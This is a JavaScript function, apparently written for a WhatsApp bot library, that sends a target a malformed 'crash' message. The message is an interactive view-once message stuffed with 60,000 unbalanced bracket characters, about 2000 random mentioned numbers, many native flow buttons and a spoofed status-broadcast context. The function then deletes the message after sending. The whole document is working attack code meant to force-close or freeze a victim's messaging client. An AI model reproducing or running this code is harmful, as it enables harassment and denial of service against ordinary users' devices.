async function FcUiFlows(sock, target) {
  const mentionedJidList = [
    target,
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 2000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const Params = "{[(".repeat(20000);

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "</𖥂 gw Ganteng\\>"
          },
          nativeFlowMessage: {
            messageParamsJson: Params,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "send_location",
                buttonParamsJson: "{}"
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "form_message",
                buttonParamsJson: ""
              },
              {
                name: "catalog_message",
                buttonParamsJson: ""
              },
              {
                name: "review_and_pay",
                buttonParamsJson: ""
              },
              {
                name: "mpm",
                buttonParamsJson: ""
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            forwardingScore: 250208,
            isForwarded: false,
            mentionedJid: mentionedJidList
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  await sleep(1);

  await sock.sendMessage(target, { delete: msg.key });
}